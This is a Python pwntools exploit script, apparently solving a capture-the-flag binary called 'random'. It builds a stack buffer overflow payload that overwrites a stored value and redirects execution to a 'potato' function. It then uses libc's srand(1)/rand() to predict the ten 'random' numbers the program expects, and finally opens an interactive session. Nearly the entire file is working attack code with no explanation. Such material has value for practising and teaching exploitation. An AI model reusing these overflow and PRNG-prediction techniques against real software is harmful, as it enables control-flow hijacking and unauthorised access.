#!/usr/bin/python3

from pwn import *
from ctypes import *

exe = ELF("random", checksec=False)
libc = CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(
            p,
            gdbscript="""
                b*0x00000000004012f7
                b* 0x401384
                c
                """,
        )
        input()


info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
    p = remote("")
else:
    p = process(exe.path)


def rc4(v3, seed):
    return (v3 + seed) % 256


GDB()
payload = b"\0" * 0x70 + p64(0x1)
payload = payload.ljust(0x90-8, b"\0")
payload += p64(exe.sym.potato + 1)
sla(b"name? ", payload)
libc.srand(1)
res = []
for i in range(0, 10):
    res.append(rc4(libc.rand(), 1))
print([hex(i) for i in res])
print(res)
p.recvuntil(b"numbers!")
for i in range(0, 10):
                sl(str(res[i]))
                sleep(1)
p.interactive()
